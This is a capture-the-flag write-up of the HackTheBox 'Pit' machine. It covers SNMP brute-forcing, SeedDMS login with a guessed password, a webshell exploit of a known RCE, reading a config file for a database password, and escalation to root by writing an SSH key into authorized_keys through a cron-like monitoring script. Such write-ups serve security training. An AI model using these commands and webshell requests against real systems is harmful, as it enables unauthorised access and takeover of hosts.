Title: Pit writeup HackTheBox - by DarkRider88
Date: 12/5/2021
Description: A medium level machine in which we are first enumerating the SNMP port which reveals some web directory which leads to SeedDms cms which is vulnerable to Remote-Command-Execution.
Image: /assets/images/pit/pit.jpg
Level: Medium

# Enumemration

NMAP scan reavealed few ports
```
Nmap scan report for 10.129.107.63
Host is up (0.26s latency).
Not shown: 997 filtered ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
| 3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)
| 256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
|_ 256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
80/tcp open http nginx 1.14.1
| http-methods:
|_ Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open ssl/zeus-admin?
| fingerprint-strings:
| GetRequest, HTTPOptions:
| HTTP/1.1 400 Bad request
| Content-Type: text/html; charset=utf8
| Transfer-Encoding: chunked
| X-DNS-Prefetch-Control: off
| Referrer-Policy: no-referrer
| X-Content-Type-Options: nosniff
| Cross-Origin-Resource-Policy: same-origin
| <!DOCTYPE html>
| <html>
| <head>
| <title>
| request
| </title>
| <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
| <meta name="viewport" content="width=device-width, initial-scale=1.0">
| <style>
| body {
| margin: 0;
| font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
| font-size: 12px;
| line-height: 1.66666667;
| color: #333333;
| background-color: #f5f5f5;
| border: 0;
| vertical-align: middle;
| font-weight: 300;
|_ margin: 0 0 10p
| ssl-cert: Subject: commonName=dms-pit.htb/
organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Issuer: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/
countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-16T23:29:12
| Not valid after: 2030-06-04T16:09:12
| MD5: 0146 4fba 4de8 5bef 0331 e57e 41b4 a8ae
|_SHA-1: 29f2 edc3 7ae9 0c25 2a9d 3feb 3d90 bde6 dfd3 eee5
```
We have two vhost from nmap: dms-pit.htb & pit.htb
Trying to bruteforce community string of snmp

```
msf6 auxiliary(scanner/snmp/snmp_login) > set rhosts 10.129.107.251                                                                                        
rhosts => 10.129.107.251                                                                                                                                   
msf6 auxiliary(scanner/snmp/snmp_login) > exploit                                                                                                          
                                                                                                                                                           
[!] No active DB -- Credential data will not be saved!                                                                                                     
[+] 10.129.107.251:161 - Login Successful: public
```
password: public

### enumerating SNMP
```
snmpwalk -v 1 -c public 10.129.107.251
```

here we are targetting NetSNMP enterprise
```
snmpwalk -v 2c -c public 10.129.108.143 1.3.6.1.4.1
```
This gave us two important things:
user: Michelle
web directory: /var/www/html/seeddms51x/seeddms
access site from: http://dms-pit.htb/seeddms51x/seeddms/


Now we are presented with a login page and we can login using
```
michelle: michelle
```

Inside it we found that admin is saying he has updated the DMS version from 5.1.10 to 5.1.15, and the previous version had RCE, so what if he has not updated it yet.
So I am trying that RCE: https://packetstormsecurity.com/files/153383/SeedDMS-Remote-Command-Execution.html

access the shell: http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd=id

reading the settings.xml
view-source:http://dms-pit.htb/seeddms51x/data/1048576/38/1.php?f=cat%20../../../conf/settings.xml

view-source:http://dms-pit.htb/seeddms51x/data/1048576/41/1.php?f=cat%20/var/www/html/seeddms51x/conf/settings.xml

```
 <database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
    </database>
```

Login using this password in pit.htb:9090
```
michelle: ied^ieY6xoquu
```
In the left menu we see there is a terminal option, click on it and get the flag
![](/assets/images/pit//cockpit-shell.png)

## Root

While excessing SNMP through snmpwalk we saw there is a binary /usr/bin/monitor, its time to check that.
```
$ file /usr/bin/monitor
/usr/bin/monitor: Bourne-Again shell script, ASCII text executable
```
So it is a ASCII text, and we can read it
```
[michelle@pit monitoring]$ cat /usr/bin/monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
```

Reading check.sh and executing, so lets add our public ssh key to it.
To create ssh key you can use
```
ssh-keygen -f key
```

Now on the box enter following

```
echo "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD3oHi/9L68FQlnPuWKEwtA82FKR3C4WFRSwYzv07JB10pD6239m2TLH0bFqiM7OXKmfNZ+EfXmtPz3noHNzqigygwkfrn1FoDMB+madqpHbWAiBOynu/IBjoFRbFfphcovOWqMDE2qcoQbolV+hsxncn//4sqi4X44n0Uu+bi0G/fC6Z3REmu0uFym1IQwgJzqgjucv+0/3tRlFXWYdtLziot7+vKnF5adkulMCpfOdmuR6uczAB36iiSxg9at+xO7svXmH1i2uSrFxRQjZC6X5tYU+WOocOvY5hapo0/I/wjd5L/vusEmejtUnCppofFBYeiN5jvI4dVEK0Dh5OYucj1FWnSdsmqgnuxNbpnZgG1dP6LW6t8M7C9kehVhGw/eGQx6pPuf10VYlEPEAjIOfZ/g9xPsCw05X0gOqQ8tNa0e1bku+tzjEhq5qjygmbge0NdizNJTvRaLklxLKmZl0ezIz52R7vwZJhN284PywxL0G25xEWyqx3ulFEhTDwU= darkrider@sunshine' > /root/.ssh/authorized_keys" > check.sh
```

But how do we trigger it?
Remember snmpwalk? use that command again

```
snmpwalk -v 2c -c public 10.129.108.143 1.3.6.1.4.1
```

And now login to ssh as root